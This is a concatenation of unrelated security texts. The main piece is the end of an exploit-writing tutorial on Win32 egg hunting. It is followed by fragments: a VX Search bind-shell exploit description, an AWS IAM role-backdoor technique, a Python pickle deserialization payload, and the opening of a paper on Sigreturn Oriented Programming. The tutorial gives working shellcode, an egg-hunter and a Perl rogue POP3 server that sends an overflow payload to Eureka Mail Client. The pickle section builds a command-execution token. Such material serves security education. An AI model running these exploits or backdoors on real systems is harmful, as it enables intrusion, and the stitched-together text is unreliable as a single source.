32bit 0(FFFFFFFF)\nP 0  CS 001B 32bit 0(FFFFFFFF)\nA 0  SS 0023 32bit 0(FFFFFFFF)\nZ 0  DS 0023 32bit 0(FFFFFFFF)\nS 0  FS 003B 32bit 7FFDF000(FFF)\nT 0  GS 0000 NULL\nD 0\nO 0  LastErr ERROR_INVALID_WINDOW_HANDLE (00000578)\nEFL 00000202 (NO,NB,NE,A,NS,PO,GE,G)\nST0 empty -UNORM FB18 00000202 0000001B\nST1 empty -UNORM B7FC 00000000 F894BBD0\nST2 empty -UNORM A70E 06D90000 0120027F\nST3 empty +UNORM 1F80 00400000 BF8131CE\nST4 empty %#.19L\nST5 empty -UNORM CCB4 00000286 0000001B\nST6 empty 9.5000000000000000000\nST7 empty 19.000000000000000000\n3 2 1 0      E S P U O Z D I\nFST 0120  Cond 0 0 0 1  Err 0 0 1 0 0 0 0 0  (LT)\nFCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1\nEBX may be a good choice.  But EDI is even better because it already\ncontains a good address, located before the eggs.    That means that we\njust have to leave the current value of EDI (instead of clearing it\nout) to reposition the omelet hunter.  Quick fix : replace the xor\nedi,edi instruction with 2 nops.\nThe changed omelet code in the exploit nows looks like this :\nmy $omelet_code = \"\\x90\\x90\\xEB\\x23\\x51\\x64\\x89\\x20\\xFC\\xB0\\x7A\\xF2\".\n\"\\xAE\\x50\\x89\\xFE\\xAD\\x35\\xFF\\x55\\xDA\\xBA\\x83\\xF8\\x03\\x77\\x0C\\x59\".\n\"\\xF7\\xE9\\x64\\x03\\x42\\x08\\x97\\xF3\\xA4\\x89\\xF7\\x31\\xC0\\x64\\x8B\\x08\".\n\"\\x89\\xCC\\x59\\x81\\xF9\\xFF\\xFF\\xFF\\xFF\\x75\\xF5\\x5A\\xE8\\xC7\\xFF\\xFF\".\n\"\\xFF\\x61\\x8D\\x66\\x18\\x58\\x66\\x0D\\xFF\\x0F\\x40\\x78\\x06\\x97\\xE9\\xD8\".\n\"\\xFF\\xFF\\xFF\\x31\\xC0\\x64\\xFF\\x50\\x08\";\nRun the exploit again, (Eureka still attached to Immunity Debugger, and\nwith breakpoint on jmp esp again). Breakpoint is hit, press F7 to start\ntracing. You should see the omelet code start (with 2 nops this time),\nand instruction \u201cREPNE SCAS BYTE PTR ES:[EDI]\u201d will continue to run\nuntil an egg is found.\nBased on the output of another \u201c!pvefindaddr compare c:\\tmp\\egg1.bin\u201d\ncommand, we should find the egg at 0x00473C5C\n[109]image\nWhen the first tag is found (and verified to be correct), a location on\nthe stack is calculated (0x00126000 in my case), and the shellcode\nafter the tag is copied to that location. ECX is now used as a counter\n(counts down to 0) so only the shellcode is copied and the omelet can\ncontinue when ECX reaches 0.\n[110]image\nWhen the shellcode in egg1 is copied, (and we can see the garbage after\negg1), the omelet code continues its search for part 2\n[111]image\nThis process repeats itself until all eggs are found and written on the\nstack.  Instead of stopping the search, the omelet code just continues\nthe search\u2026  Result : we end up with an access violation again :\n[112]image\nSo, we know that the omelet code ran properly (we should be able to\nfind the entire shellcode in memory somewhere), but it did not stop\nwhen it had to.  First, verify that the shellcode in memory is indeed\nan exact copy of the original shellcode.\nWe still have the shellcode.bin file that was created earlier (when\nbuilding the omelet code). Copy the file to c:\\tmp and run this command\nin Immunity Debugger :\n!pvefindaddr compare c:\\tmp\\shellcode.bin\n[113]image\nok, the entire unmodified shellcode was indeed found at 0x00126000.\nThat\u2019s great, because it proves that the omelet worked fine\u2026 it just\ndid not stop searching, tripped at the end, fell flat on the floor and\ndied.\nDamn\nFixing the omelet code \u2013 welcome corelanc0d3r\u2019s omelet\nSince the eggs are in the right order in memory, perhaps a slight\nmodification of the omelet code may make it work. What if we use one of\nthe registers to keep track of the remaining number of eggs to find,\nand make the code jump to the shellcode when this register indicates\nthat all eggs have been found.\nLet\u2019s give it a try (Although I\u2019m not a big asm expert, I\u2019m feeling\nlucky today :) )\nWe need to start the omelet code with creating a start value that will\nbe used to count the number of eggs found : 0 \u2013 the number of eggs or\n0xFFFFFFFF \u2013 number of eggs + 1  (so if we have 3 eggs, we\u2019ll use\nFFFFFFFD). After looking at the omelet code (in the debugger), I\u2019ve\nnoticed that EBX is not used, so we\u2019ll store this value in EBX.\nNext, what I\u2019ll make the omelet code do is this : each time an egg is\nfound, increment this value with one.  When the value is FFFFFFFF, all\neggs have been found, so we can make the jump.\nOpcode for putting 0xFFFFFFFD in EBX is \\xbb\\xfd\\xff\\xff\\xff. So we\u2019ll\nneed to start the omelet code with this instruction.\nThen, after the shellcode from a given egg is copied to the stack,\nwe\u2019ll need to verify if we have seen all the eggs or not. (so we\u2019ll\ncompare EBX with FFFFFFFF. If they are the same, we can jump to the\nshellcode. If not, increment EBX.) Copying the shellcode to the stack\nis performed via the following instruction :  F3:A4, so the check and\nincrement must be placed right after.\n[114]image\nRight after this instruction, we\u2019ll insert the compare, jump if equal,\nand \u201cINC EBX\u201d  (\\x43)\nLet\u2019s modify the master asm code :\nBITS 32\n; egg:\n; LL II M1 M2 M3 DD DD DD ... (LL * DD)\n; LL == Size of eggs (same for all eggs)\n; II == Index of egg (different for each egg)\n; M1,M2,M3 == Marker byte (same for all eggs)\n; DD == Data in egg (different for each egg)\n; Original code by skylined\n; Code tweaked by Peter Van Eeckhoutte\n; peter.ve[at]corelan.be\n; https:\/\/www.corelan.be\nmarker equ 0x280876\negg_size equ 0x3\nmax_index equ 0x2\nstart:\nmov ebx,0xffffffff-egg_size+1 ; ** Added : put initial counter in EBX\njmp     SHORT reset_stack\ncreate_SEH_handler:\nPUSH    ECX                     ; SEH_frames[0].nextframe == 0xFFFFFFFF\nMOV     [FS:EAX], ESP           ; SEH_chain -> SEH_frames[0]\nCLD                             ; SCAN memory upwards from 0\nscan_loop:\nMOV     AL, egg_size            ; EAX = egg_size\negg_size_location equ $-1 - $$\nREPNE   SCASB                   ; Find the first byte\nPUSH    EAX                     ; Save egg_size\nMOV     ESI, EDI\nLODSD                           ; EAX = II M2 M3 M4\nXOR     EAX, (marker << 8) + 0xFF  ; EDX = (II M2 M3 M4) ^ (FF M2 M3 M4)\n;    == egg_index\nmarker_bytes_location equ $-3 - $$\nCMP     EAX, BYTE max_index     ; Check if the value of EDX is < max_index\nmax_index_location equ $-1 - $$\nJA      reset_stack             ; No -> This was not a marker, continue scan\nPOP     ECX                     ; ECX = egg_size\nIMUL    ECX                     ; EAX = egg_size * egg_index == egg_offset\n; EDX = 0 because ECX * EAX is always less than 0x1,000,000\nADD     EAX, [BYTE FS:EDX + 8]   ; EDI += Bottom of stack ==\n;      position of egg in shellcode.\nXCHG    EAX, EDI\ncopy_loop:\nREP     MOVSB                   ; copy egg to basket\nCMP EBX, 0xFFFFFFFF ; ** Added : see if we have found all eggs JE done ; ** Add\ned : If we have found all eggs, ; ** jump to shellcode INC EBX ; ** Added : incr\nement EBX ; (if we are not at the end of the eggs)\nMOV     EDI, ESI                ; EDI = end of egg\nreset_stack:\n; Reset the stack to prevent problems cause by recursive SEH handlers and set\n; ourselves up to handle and AVs we may cause by scanning memory:\nXOR     EAX, EAX                ; EAX = 0\nMOV     ECX, [FS:EAX]           ; EBX = SEH_chain => SEH_frames[X]\nfind_last_SEH_loop:\nMOV     ESP, ECX                ; ESP = SEH_frames[X]\nPOP     ECX                     ; EBX = SEH_frames[X].next_frame\nCMP     ECX, 0xFFFFFFFF         ; SEH_frames[X].next_frame == none ?\nJNE     find_last_SEH_loop      ; No \"X -= 1\", check next frame\nPOP     EDX                     ; EDX = SEH_frames[0].handler\nCALL    create_SEH_handler      ; SEH_frames[0].handler == SEH_handler\nSEH_handler:\nPOPA                            ; ESI = [ESP + 4] ->\n;     struct exception_info\nLEA     ESP, [BYTE ESI+0x18]    ; ESP = struct exception_info->exception_addr\nPOP     EAX                     ; EAX = exception address 0x????????\nOR      AX, 0xFFF               ; EAX = 0x?????FFF\nINC     EAX                     ; EAX = 0x?????FFF + 1 -> next page\nJS      done                    ; EAX > 0x7FFFFFFF ===> done\nXCHG    EAX, EDI                ; EDI => next page\nJMP     reset_stack\ndone:\nXOR     EAX, EAX                ; EAX = 0\nCALL    [BYTE FS:EAX + 8]       ; EDI += Bottom of stack\n;    == position of egg in shellcode.\ndb      marker_bytes_location\ndb      max_index_location\ndb      egg_size_location\nYou can download the tweaked code here :\n[115]corelanc0d3r w32_seh_omelet (ASM) (3.7 KiB)\nCompile this modified code again, and recreate the eggs :\n\u201cc:\\program files\\nasm\\nasm.exe\u201d -f bin -o w32_omelet.bin\nw32_SEH_corelanc0d3r_omelet.asm -w+error\nw32_SEH_omelet.py w32_omelet.bin shellcode.bin calceggs.txt 127\n0xBADA55\nCopy the omelet code from the newly created calceggs.txt file and put\nit in the exploit.\nExploit now looks like this :\nuse Socket;\n#fill out the local IP or hostname\n#which is used by Eureka EMail as POP3 server\n#note : must be exact match !\nmy $localserver = \"192.168.0.193\";\n#calculate offset to EIP\nmy $junk = \"A\" x (723 - length($localserver));\nmy $ret=pack('V',0x7E47BCAF); #jmp esp from user32.dll\nmy $padding = \"\\x90\" x 1000;\nmy $omelet_code = \"\\xbb\\xfd\\xff\\xff\\xff\".   #put 0xfffffffd in ebx\n\"\\xEB\\x2C\\x51\\x64\\x89\\x20\\xFC\\xB0\\x7A\\xF2\\xAE\\x50\".\n\"\\x89\\xFE\\xAD\\x35\\xFF\\x55\\xDA\\xBA\\x83\\xF8\\x03\\x77\".\n\"\\x15\\x59\\xF7\\xE9\\x64\\x03\\x42\\x08\\x97\\xF3\\xA4\".\n\"\\x81\\xFB\\xFF\\xFF\\xFF\\xFF\".   # compare EBX with FFFFFFFF\n\"\\x74\\x2B\".   #if EBX is FFFFFFFF, jump to shellcode\n\"\\x43\".       #if not, increase EBX and continue\n\"\\x89\\xF7\\x31\\xC0\\x64\\x8B\\x08\\x89\\xCC\\x59\\x81\\xF9\".\n\"\\xFF\\xFF\\xFF\\xFF\\x75\\xF5\\x5A\\xE8\\xBE\\xFF\\xFF\\xFF\".\n\"\\x61\\x8D\\x66\\x18\\x58\\x66\\x0D\\xFF\\x0F\\x40\\x78\\x06\".\n\"\\x97\\xE9\\xD8\\xFF\\xFF\\xFF\\x31\\xC0\\x64\\xFF\\x50\\x08\";\nmy $egg1 = \"\\x7A\\xFF\\x55\\xDA\\xBA\\x89\\xE2\\xDA\\xC1\\xD9\\x72\\xF4\\x58\\x50\".\n\"\\x59\\x49\\x49\\x49\\x49\\x43\\x43\\x43\\x43\\x43\\x43\\x51\\x5A\\x56\\x54\\x58\\x33\".\n\"\\x30\\x56\\x58\\x34\\x41\\x50\\x30\\x41\\x33\\x48\\x48\\x30\\x41\\x30\\x30\\x41\\x42\".\n\"\\x41\\x41\\x42\\x54\\x41\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x58\".\n\"\\x50\\x38\\x41\\x43\\x4A\\x4A\\x49\\x4B\\x4C\\x4A\\x48\\x50\\x44\\x43\\x30\\x43\\x30\".\n\"\\x45\\x50\\x4C\\x4B\\x47\\x35\\x47\\x4C\\x4C\\x4B\\x43\\x4C\\x43\\x35\\x43\\x48\\x45\".\n\"\\x51\\x4A\\x4F\\x4C\\x4B\\x50\\x4F\\x42\\x38\\x4C\\x4B\\x51\\x4F\\x47\\x50\\x43\\x31\".\n\"\\x4A\\x4B\\x51\\x59\\x4C\\x4B\\x46\\x54\\x4C\\x4B\\x43\";\nmy $egg2 = \"\\x7A\\xFE\\x55\\xDA\\xBA\\x31\\x4A\\x4E\\x50\\x31\\x49\\x50\\x4C\\x59\".\n\"\\x4E\\x4C\\x4C\\x44\\x49\\x50\\x43\\x44\\x43\\x37\\x49\\x51\\x49\\x5A\\x44\\x4D\\x43\".\n\"\\x31\\x49\\x52\\x4A\\x4B\\x4A\\x54\\x47\\x4B\\x51\\x44\\x46\\x44\\x43\\x34\\x42\\x55\".\n\"\\x4B\\x55\\x4C\\x4B\\x51\\x4F\\x51\\x34\\x45\\x51\\x4A\\x4B\\x42\\x46\\x4C\\x4B\\x44\".\n\"\\x4C\\x50\\x4B\\x4C\\x4B\\x51\\x4F\\x45\\x4C\\x45\\x51\\x4A\\x4B\\x4C\\x4B\\x45\\x4C\".\n\"\\x4C\\x4B\\x45\\x51\\x4A\\x4B\\x4D\\x59\\x51\\x4C\\x47\\x54\\x43\\x34\\x48\\x43\\x51\".\n\"\\x4F\\x46\\x51\\x4B\\x46\\x43\\x50\\x50\\x56\\x45\\x34\\x4C\\x4B\\x47\\x36\\x50\\x30\".\n\"\\x4C\\x4B\\x51\\x50\\x44\\x4C\\x4C\\x4B\\x44\\x30\\x45\";\nmy $egg3 = \"\\x7A\\xFD\\x55\\xDA\\xBA\\x4C\\x4E\\x4D\\x4C\\x4B\\x45\\x38\\x43\\x38\".\n\"\\x4B\\x39\\x4A\\x58\\x4C\\x43\\x49\\x50\\x42\\x4A\\x50\\x50\\x42\\x48\\x4C\\x30\\x4D\".\n\"\\x5A\\x43\\x34\\x51\\x4F\\x45\\x38\\x4A\\x38\\x4B\\x4E\\x4D\\x5A\\x44\\x4E\\x46\\x37\".\n\"\\x4B\\x4F\\x4D\\x37\\x42\\x43\\x45\\x31\\x42\\x4C\\x42\\x43\\x45\\x50\\x41\\x41\\x40\".\n\"\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\".\n\"\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\".\n\"\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\".\n\"\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\\x40\";\nmy $garbage=\"This is a bunch of garbage\" x 10;\nmy $payload=$junk.$ret.$omelet_code.$padding.$egg1.$garbage.$egg2.$garbage.$egg3\n;\nprint \"Payload : \" . length($payload).\" bytes\\n\";\nprint \"Omelet code : \" . length($omelet_code).\" bytes\\n\";\nprint \" Egg 1 : \" . length($egg1).\" bytes\\n\";\nprint \" Egg 2 : \" . length($egg2).\" bytes\\n\";\nprint \" Egg 3 : \" . length($egg3).\" bytes\\n\";\n#set up listener on port 110\nmy $port=110;\nmy $proto=getprotobyname('tcp');\nsocket(SERVER,PF_INET,SOCK_STREAM,$proto);\nmy $paddr=sockaddr_in($port,INADDR_ANY);\nbind(SERVER,$paddr);\nlisten(SERVER,SOMAXCONN);\nprint \"[+] Listening on tcp port 110 [POP3]... \\n\";\nprint \"[+] Configure Eureka Mail Client to connect to this host \\n\";\nmy $client_addr;\nwhile($client_addr=accept(CLIENT,SERVER))\n{\nprint \"[+] Client connected, sending evil payload\\n\";\n$cnt=1;\nwhile($cnt < 10)\n{\nprint CLIENT \"-ERR \".$payload.\"\\n\";\nprint \" -> Sent \".length($payload).\" bytes\\n\";\n$cnt=$cnt+1;\n}\n}\nclose CLIENT;\nprint \"[+] Connection closed\\n\";\nOk, the omelet code is slightly larger, and my changes could perhaps be\nimproved a little, but hey:  look at the result :\n[116]image\n[117]image\npwned ! :-)\nTraining\nThis exploit writing series are accessible for free, and may have\nhelped certain people one way or another in their quest to learning\nabout windows exploitation.  Reading manuals and tutorials are a good\nstart, but sometimes it\u2019s better to get things explained by experts,\n101, during some sort of class or training.\nIf you are interested in getting some class based training, check out\nhttps:\/\/www.corelan-training.com\nAll my thanks are belong to you :\nMy friends @ Corelan Team  (Ricardo, EdiStrosar, mr_me, ekse, MarkoT,\nsinn3r, Jacky  : you guys r0ck ! ) ,\nBerend-Jan Wever (a.k.a. SkyLined), for writing some great stuff,\nand thanks to everyone taking the time to read this stuff, provide\nfeedback, and help others on [118]my forum.\nAlso, cheers to some other nice people I met on Twitter\/IRC over the\nlast couple of months. ([119]curtw, [120]Trancer00t, [121]mubix,\n[122]psifertex, [123]pusscat, [124]hdm, [125]FX, NCR\/CRC! [ReVeRsEr],\n[126]Bernardo Damele, [127]Shahin Ramezany, [128]muts, nullthreat, etc\u2026\n)\nTo some of the people I have listed here : Big thanks for responding to\nmy questions or comments (it means a lot to me), and\/or reviewing the\ntutorial drafts\u2026\nFinally : thanks to anyone who showed interest in my work, tweeted\nabout it, retweeted messages or simply expressed their appreciation in\nvarious mailinglists and forums.  Spread the word & make my day !\nRemember : Life is not about what you know, but about the will to\nlisten, learn, share & teach.\nTerms of Use applicable to this document :\n[129]https:\/\/www.corelan.be\/index.php\/terms-of-use\/\n[130]  Copyright secured by Digiprove \u00a9 2010 Peter Van Eeckhoutte\n\u00a9 2010 \u2013 2021, [131]Peter Van Eeckhoutte (corelanc0d3r). All rights\nreserved.\nSimilar\/Related posts:\n[132]Default Thumbnail WoW64 Egghunter [133]Default Thumbnail Exploit\nwriting tutorial part 3b : SEH Based Exploits \u2013 just another example\n[134]Default Thumbnail Exploit writing tutorial part 1 : Stack Based\nOverflows [135]Default Thumbnail Starting to write Immunity Debugger\nPyCommands : my cheatsheet [136]Default Thumbnail Exploit writing\ntutorial part 3 : SEH Based Exploits\nPosted in [137]001_Security, [138]Exploit Writing Tutorials,\n[139]Exploits | Tagged [140]alpha2, [141]alpha3, [142]alphanumeric,\n[143]asm, [144]bad char, [145]custom encoder, [146]direct ret,\n[147]egg, [148]eip, [149]encode, [150]exploit, [151]exploit writing,\n[152]find shellcode, [153]hunter, [154]hunting, [155]immunity,\n[156]inject, [157]isbadreadptr, [158]marker, [159]memory,\n[160]metasploit, [161]nasm, [162]nop, [163]ntdisplaystring,\n[164]omelet, [165]pvefindaddr, [166]search, [167]seh, [168]shellcode,\n[169]skape, [170]skylined, [171]small buffer, [172]staged, [173]tag,\n[174]trampoline, [175]tutorial, [176]unicode, [177]venetian,\n[178]win32, [179]win32_seh_omelet\n16 Responses to Exploit writing tutorial part 8 : Win32 Egg Hunting\n* Pingback: [180]Recognize-Security | Peter Van Eeckhoutte\u2019s Exploit\nWriting Tutorials\n* Pingback: [181]Hack Notes : Ropping eggs for breakfast | Corelan\nTeam\n____________________ Search\nCorelan Training\nWe have been teaching our win32 exploit dev classes at various security\ncons and private companies & organizations since 2011\nCheck out our schedules page [182]here and sign up for one of our\nclasses now!\nDonate\nWant to support the Corelan Team community ? [183]Click here to go to\nour donations page.\nWant to donate BTC to Corelan Team?\n[donate_btc_to_corelan_thumb.png]\nYour donation will help funding server hosting.\n[INS: :INS]\nCorelan Team Merchandise\nYou can support Corelan Team by donating or purchasing items from\n[184]the official Corelan Team merchandising store.\n[185]Protected by Copyscape Web Plagiarism Tool\nCorelan on Slack\nYou can chat with us and our friends on our Slack workspace:\nGo to [186]our facebook page\nBrowse through the posts and find the invite to Slack\nUse the invite to access our Slack workspace\nActions\n* [187]Log in\n* [188]Entries feed\n* [189]Comments feed\n* [190]WordPress.org\nCategories\nCategories[Select Category_____________]\nMastodon: [191]@corelanc0d3r | [192]@corelan\nCopyright Peter Van Eeckhoutte \u00a9 2007 - 2024 | All Rights Reserved |\n[193]Terms of use\n7ads6x98y\nHi there!\nDo you like our free content? Enjoying the materials we put together?\nAre you interested in learning how to write exploits for Windows, but\nperhaps looking for updated materials?\nAre you struggling to fully grasp the concepts based on what you find\nonline? Would you perhaps prefer to learn in a classroom setting\ninstead?\nWe have good news for you!\nDid you know that we travel to strategic places around the world, to\nteach our world-renowned exploit development classes.\nIn order to preserve and ensure a top-quality learning experience, all\nof our classes are delivered in-person.\nI also teach private classes! For larger groups, I\u2019ll glady come to\nyou. For smaller groups, willing to travel to Belgium,  I\u2019ll provide a\ntraining room near Bruges.\nWe currently offer 2 classes:\nOur \u201c[194]Bootcamp\u201d classes covers the basics of exploit development\nfor Windows 11.\nThe \u201c[195]Advanced\u201d class covers heap exploitation for Windows 7,\nWindows 10 and Windows 11.\nBoth classes contain a short introduction on x64 exploitation!\nYou can find our schedules here:\n[196]https:\/\/www.corelan-training.com\/index.php\/training-schedules .\n>>> Our classes tend to sell out fast, so sign up today and secure\nyour seat in one of our classes !! <<<\nAnd if you\u2019re not sure \u2013 [197]feel free to check what our students have\nto say about our classes.\nEnjoy!\n(BUTTON) X\nWe are using cookies to give you the best experience on our website.\nYou can find out more about which cookies we are using or switch them\noff in (BUTTON) settings.\n(BUTTON) Accept\n(BUTTON) Change cookie settings\n(BUTTON) Close GDPR Cookie Settings\n* (BUTTON) Privacy Overview\n* (BUTTON) Strictly Necessary Cookies\n* (BUTTON) Cookie Policy\nPrivacy Overview\na. Corelan respects your privacy. Most information accessible on or via\nthe\nCorelan Website is available without the need to provide personal\ninformation.\nIn certain cases you may however be requested to submit personal\ninformation. In\nsuch case your personal information shall be treated in accordance with\nthe General Data Protection Regulation and any amendments hereof.\nb. All personal information made available by you will be treated\nsolely for\nthe purpose of making available to you the requested information or\nservices.\nYour personal information will not be shared with third parties, but it\nmay be used for authentication, support & marketing purposes in\nrelation with services provided by Corelan.\nc. We will only keep your personal information for as long as is\nrequired to\nprovide you with the requested information or services, or for any\nlonger period\nas may legally be required.\nd. It is our goal to reasonably protect the personal information made\navailable by you from third parties.\ne. You have the right to consult, correct, adjust or have removed your\npersonal details by written request to Corelan.  If you decide to get\nyour information removed, you understand and accept that you will lose\nall access to any resources that require the use of these personal\ndetails, such as parts of the website that require authentication.\nf. When using the Corelan Website, cookies may possible be used. You do\nnot have to accept cookies to be able to use the publicly accessible\nparts of Corelan Websites. If you have an account and you log in to\nthis site, we will set a temporary cookie to determine if your browser\naccepts cookies. This cookie contains no personal data and is discarded\nwhen you close your browser.\nWhen you log in, we will also set up several cookies to save your login\ninformation and your screen display choices.   Cookies may be used to\ndisplay advertisements or to collect statistics about the use of the\nCorelan website.\ng. This privacy policy may be amended by Corelan at any time.\nStrictly Necessary Cookies\nStrictly Necessary Cookie should be enabled at all times so that we can\nsave your preferences for cookie settings.\nEnable or Disable Cookies [ ]\nIf you disable this cookie, we will not be able to save your\npreferences. This means that every time you visit this website you will\nneed to enable or disable cookies again.\nCookie Policy\nWhen using the Corelan Website, cookies may possibly be used. You do\nnot have to accept cookies to be able to use the publicly accessible\nparts of the Corelan Website. If you have an account and you log in to\nthis site, we will set a temporary cookie to determine if your browser\naccepts cookies. This cookie contains no personal data and is discarded\nwhen you close your browser. When you log in, we will also set up\nseveral cookies to save your login information and your screen display\nchoices.\nWe may use third party cookies to show ads and to collect anonymous\ninformation such as the number of visitors to the site, and the most\npopular pages.  The ability to show ads is an important source of\nincome to cover the hosting fees to keep this website alive. If you\nprevent ads from being displayed, this website will eventually\ndisappear.\nThird party vendors, including Google, use cookies to serve ads based\non a user's prior visits to this website or other websites.\nGoogle's use of advertising cookies enables it and its partners to\nserve ads to your users based on their visit to this site and\/or other\nsites on the Internet.\n(BUTTON) Enable All (BUTTON) Save Changes"}
{"text":"# Description\n\nVX Search v10.2.14 suffers from a local buffer overflow. The following exploit will generate a bind shell on port 1337.\n\n## Exploitation Example\n\n![alt text](https:\/\/github.com\/wetw0rk\/Exploit-Development\/blob\/master\/Personal-Exploits\/VXSearch%20v10.2.14%20-%20Local%20Code%20Execution\/images\/Proof.png)\n"}
{"text":"---\ntitle: Backdoor an IAM Role\n---\n\n# Backdoor an IAM Role\n\n\n <span class=\"smallcaps w3-badge w3-blue w3-round w3-text-white\" title=\"This attack technique can be detonated multiple times\">idempotent<\/span> \n\nPlatform: AWS\n\n## MITRE ATT&CK Tactics\n\n\n- Persistence\n\n## Description\n\n\nEstablishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.\n\n<span style=\"font-variant: small-caps;\">Warm-up<\/span>: \n\n- Create an IAM role.\n\n<span style=\"font-variant: small-caps;\">Detonation<\/span>: \n\n- Update the assume role policy of the IAM role to backdoor it, making it accessible from an external, fictitious AWS account:\n\n<pre>\n<code>\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Service\": \"ec2.amazonaws.com\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}\n<\/code>\n<\/pre>\n\n\n## Instructions\n\n```bash title=\"Detonate with Stratus Red Team\"\nstratus detonate aws.persistence.iam-backdoor-role\n```\n## Detection\n\n\n- Using CloudTrail's <code>UpdateAssumeRolePolicy<\/code> event.\n\n- Through [IAM Access Analyzer](https:\/\/docs.aws.amazon.com\/IAM\/latest\/UserGuide\/access-analyzer-resources.html#access-analyzer-iam-role), \nwhich generates a finding when a role can be assumed from a new AWS account or publicly.\n\n\n"}
{"text":"# Python Deserialization\n\n## Pickle\n\nThe following code is a simple example of using `cPickle` in order to generate an auth_token which is a serialized User object.\n\n```python\nimport cPickle\nfrom base64 import b64encode, b64decode\n\nclass User:\n    def __init__(self):\n        self.username = \"anonymous\"\n        self.password = \"anonymous\"\n        self.rank     = \"guest\"\n\nh = User()\nauth_token = b64encode(cPickle.dumps(h))\nprint(\"Your Auth Token : {}\").format(auth_token)\n```\n\nThe vulnerability is introduced when a token is loaded from an user input. \n\n```python\nnew_token = raw_input(\"New Auth Token : \")\ntoken = cPickle.loads(b64decode(new_token))\nprint \"Welcome {}\".format(token.username)\n```\n\nPython 2.7 documentation clearly states Pickle should never be used with untrusted sources. Let's create a malicious data that will execute arbitrary code on the server.\n\n> The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.\n\n```python\nimport cPickle\nfrom base64 import b64encode, b64decode\n\nclass Evil(object):\n    def __reduce__(self):\n        return (os.system,(\"whoami\",))\n\ne = Evil()\nevil_token = b64encode(cPickle.dumps(e))\nprint(\"Your Evil Token : {}\").format(evil_token)\n```\n\n## References\n\n* [Exploiting misuse of Python's \"pickle\" - Mar 20, 2011](https:\/\/blog.nelhage.com\/2011\/03\/exploiting-pickle\/)\n* [Python Pickle Injection - Apr 30, 2017](http:\/\/xhyumiracle.com\/python-pickle-injection\/)"}
{"text":"Heinrich C. Mayr, Martin Pinzger (Hrsg.): INFORMATIK 2016,\nLecture Notes in Informatics (LNI), Gesellschaft fr Informatik, Bonn 2016 2077\nSigreturn Oriented Programming is a real Threat\nRe\u0301mi Mabon1\nAbstract: This paper shows that Sigreturn Oriented Programming (SROP), which consists of using\ncalls to sigreturn to execute arbitrary code, is a powerful method for the development of exploits.\nThis is demonstrated by developing two different kinds of SROP based exploits, one asterisk exploit\nwhich was already portrayed in the paper presenting SROP, and one novel exploit for a recently\ndisclosed bug in the DNS address resolution of the default GNU C library. Taking advantage of\nthe fact, that these exploits have very few dependencies on the program being exploited, a library\nis implemented to automate wide parts of SROP exploit creation. This highlights the potential of\nSROP in respect to reusable and portable exploit code which strongly supports the conclusion of the\noriginal paper: SROP is a real threat!\n1 Introduction\nIn the world of security, there is a constant cat and mouse game between programmers,\nwhich want to make software safer and attackers, which try to exploit vulnerabilities. This\npaper focuses on the Sigreturn Oriented Programming (SROP) technique presented by\nErik Bosman and Herbert Bos in 2014 [BB14].\nFirst, the different preconditions and ways to exploit SROP are shown in section 2. To\ndemonstrate the use of both SROP exploitation techniques on real targets, section 3 focuses\non the implementation of the SROP Chain based Asterisk exploit mentioned in [BB14]\nand the following section 4 demonstrates the use of an SROP based attack using a known\naddress on a target which resolves DNS addresses with glibc. The reusability of SROP\nattacks is then demonstrated in section 5 by analyzing how much of the code used in the\nprevious exploits can be reused to exploit a self made exploitable binary. This results in a\nreusable library for SROP attacks. Following this, section 6 gives an estimate on how much\nsome defence mechanisms mitigate the danger of SROP attacks. Finally, a conclusion is\ngiven in section 7.\n2 Sigreturn Oriented Programming\nSigreturn calls exist in UNIX to restore the user context after a program is interrupted by\na signal. The signal handling procedure as seen by the program looks as follows [BB14]:\n1 Furtwangen University, Robert-Gerwig-Platz 1, 78120 Furtwangen im Schwarzwald, remi.mabon@hs-\nfurtwangen.de\n\f2078 Re\u0301mi Mabon\n\u2022 A signal frame is added to the stack. This frame contains the current value of all\nregisters.\n\u2022 A new return address is added to the top of the stack. This return address simply\nleads to a small stub which executes the sigreturn system call.\n\u2022 The signal handler is called. What the signal handler does depends on the signal\nreceived.\n\u2022 After the signal handler is done, the return address is used to execute the sigreturn\nsystem call if the program wasn\u2019t terminated.\n\u2022 The sigreturn call uses the signal frame to restore all registers to their previous state.\n\u2022 Finally, the execution of the program is continued exactly as before.\nSROP exploits the fact, that UNIX systems don\u2019t check if a signal was sent when a pro-\ngram executes the sigreturn system call. Since the sigreturn call restores all registers from\nstack, this can be extremely powerful when the attacker has control of the stack as all reg-\nisters can be set to attacker controlled value with one single gadget: syscall and return.\nFurthermore, this gadget can always be found at the same locations on some systems, e.g.\nLinux with a kernel older than 3.3. A list of systems where this is the case is provided\nin [BB14].The attack is further facilitated by the fact that the sigreturn call is executed\nby using the processor instruction syscall which can also execute all other system calls\ndepending only on the value of the AX\/EAX\/RAX register (the name of the register varies\ndepending on the architecture). This way, by chaining sigreturn and other system calls, ar-\nbitrary code can be executed with only this one gadget. As demonstrated in [BB14], such\na chain is even Turing complete without using any shellcode.\nDepending on the concrete situation, there are at least two possible sets of preconditions\nneeded to execute arbitrary code using sigreturn . The \u00aerst one can be used if the attacker\nknows an address with user controlled data and is shown in subsection 2.1. The second one\nbypasses this need by using an SROP chain but requires a known \u00aele descriptor to which\nthe attacker can send data. This is shown in subsection 2.2.\n2.1 Known address\nTo execute arbitrary code using a known address with user controlled content, the follow-\ning preconditions have to be met [BB14]:\n1. The attacker needs a way to control the instruction pointer, e.g. through a return\ninstruction on stack overwritten by the attacker.\n2. The stack pointer has to be located on data controlled by the 